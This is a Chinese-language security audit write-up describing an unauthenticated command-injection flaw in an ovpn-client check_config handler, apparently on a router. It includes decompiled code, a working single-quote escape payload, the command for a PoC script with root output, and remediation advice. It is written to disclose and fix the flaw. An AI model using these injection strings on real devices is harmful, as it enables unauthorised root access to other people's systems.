# 额外漏洞：ovpn-client.check_config filename 单引号逃逸 — 未认证 RCE

> 发现于 ovpn-client.so 的二次审计。`check_config` 方法仅需 `group_id`（任意值）和 `filename`，无需预存文件即可实现未认证 root RCE。

## 漏洞概要

| 属性 | 值 |
|------|-----|
| **状态** | Confirmed + PoC 打通 |
| **认证** | **无**（直接通过 `/cgi-bin/glc` 调用） |
| **注入参数** | `filename` |
| **Sink** | `system("tar -zxvf '/tmp/ovpn_upload/%s' -C /tmp/ovpn_upload/ ...")` |
| **PoC** | `exp/poc_ovpn_check_config_rce.py` (29行) |
| **Ghidra** | check_config @ 0x00107c74 (1152B, 18基本块) |
| **r2** | check_config @ 0x7c74 — 确认地址一致 |

## Ghidra 反编译验证

```c
// ovpn-client.so check_config @ 0x00107c74, 行104-112
json_object_get(param_1, "group_id");    // 仅要求存在，值任意
json_object_get(param_1, "filename");    // ← Source: 用户控制
if (group_id == NULL || filename == NULL) {
    json_object_set_new(param_2, "err_msg", "parameter missing");
    return;
}
// ... 扩展名检查后 ...
sprintf(cmd, "tar -zxvf '/tmp/ovpn_upload/%s' -C /tmp/ovpn_upload/ ...", filename);
system(cmd);  // ← 💣 SINK
```

## 注入原理

命令模板使用**单引号**包裹文件名：
```
tar -zxvf '/tmp/ovpn_upload/FILENAME' -C ...
```

单引号在 shell 中阻止所有扩展，但文件名中的 `'` 字符可以**提前闭合引号**：

```
正常:  filename = "myconfig.tar.gz"
       → tar -zxvf '/tmp/ovpn_upload/myconfig.tar.gz' -C ...
       ✅

攻击:  filename = "';id>/tmp/poc;#.tar.gz"
       → tar -zxvf '/tmp/ovpn_upload/';id>/tmp/poc;#.tar.gz' -C ...
                      └──闭合──┘└──RCE──┘└──注释──┘
       shell 解析:
       tar -zxvf '/tmp/ovpn_upload/'   ← tar 失败（目录）
       ;                                ← 命令分隔
       id > /tmp/poc                    ← 💣 RCE
       ;                                ← 命令分隔
       #.tar.gz' -C ...                 ← # 注释剩余
```

## PoC 测试结果

```
$ python3 poc_ovpn_check_config_rce.py https://192.168.8.1 "id > /tmp/poc_ovpn_check"
[+] filename: '';id > /tmp/poc_ovpn_check; ls -la /tmp/poc_ovpn_check;#.tar.gz'
[+] response: (空 — 无错误)

# Download verification:
$ curl ... /download path=/tmp/poc_ovpn_check
uid=0(root) gid=0(root)
```

## 与 upload_config 的对比

| 特性 | upload_config | check_config |
|------|--------------|--------------|
| 认证要求 | 需要 /upload 暂存文件 | **无需认证** |
| 参数结构 | `file.savepath` + `file.filename` (嵌套) | `group_id` + `filename` (顶层) |
| 前置条件 | 需要有效的 seed tar.gz | **无需任何文件** |
| system() 模板 | `tar -zxvf "%s"` (双引号) | `tar -zxvf '/tmp/ovpn_upload/%s'` (单引号) |
| 逃逸字符 | `$()` (双引号内展开) | `'` (闭合单引号) |

**check_config 更危险**：无需认证、无需预存文件、单次请求即可触发。

## 修复建议

1. 使用 `fork()+execv()` 数组传参替代 `system()`，彻底消除 shell 注入
2. 校验 filename 仅允许 `^[a-zA-Z0-9._-]+$`
3. 为 `/cgi-bin/glc` 添加认证机制
